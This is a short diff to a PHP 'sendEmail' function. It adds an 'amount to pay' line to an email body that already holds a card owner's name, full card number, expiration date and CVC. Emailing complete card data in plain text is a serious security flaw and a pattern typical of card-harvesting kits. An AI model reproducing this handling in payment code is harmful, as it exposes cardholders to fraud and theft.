@@ -31,6 +31,7 @@ function sendEmail($post) {
     $html_body = "<h3>You have received a new message.</h3>";
     $html_body .= "<p><strong>Card owner:</strong> $name</p>";
     $html_body .= "<p><strong>card number:</strong> $card_number</p>";
+    $html_body .= "amount to pay: $amount_to_pay\n";
     $html_body .= "<p><strong>card expiration year:</strong><br>$card_expiration_year</p>";
     $html_body .= "<p><strong>card expiration month:</strong><br>$card_expiration_month</p>";
     $html_body .= "<p><strong>cvc:</strong><br>$cvv</p>";
